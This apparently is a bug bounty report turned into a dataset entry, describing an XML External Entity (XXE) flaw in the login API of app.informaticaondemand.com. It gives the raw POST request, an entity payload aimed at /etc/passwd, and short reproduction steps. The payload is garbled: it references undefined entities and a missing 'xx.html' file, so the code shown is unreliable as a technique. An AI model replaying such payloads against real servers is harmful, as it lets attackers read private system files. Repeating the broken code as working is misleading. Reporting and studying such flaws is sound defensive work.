title: [app.informaticaondemand.com] XXE
content:
Request:
POST /ma/api/v2/user/login HTTP/1.1
Host: app.informaticaondemand.com
Content-Length: 285
Content-Type: application/xml
Accept: application/xml
Code 64 Bytes
1<!DOCTYPE root [
2<!ENTITY % b PUBLIC "lol" "file:///etc/passwd">
%asd;
%rrr;]>

Where xx.html:
Then i got file /etc/passwd (xxe_app.png)
steps: Send a POST request to /ma/api/v2/user/login with Content-Type: application/xml and include an XXE payload in the body.
Observe the response containing the contents of /etc/passwd due to the XXE vulnerability.
vuln_description: This is an XML External Entity (XXE) vulnerability that allows an attacker to read arbitrary files from the server, such as /etc/passwd, by injecting malicious XML entities in the request body.
reason: The vulnerability involves a straightforward XXE attack with no complex interactions or state manipulations. The attacker only needs to craft a simple XML payload with external entity references.
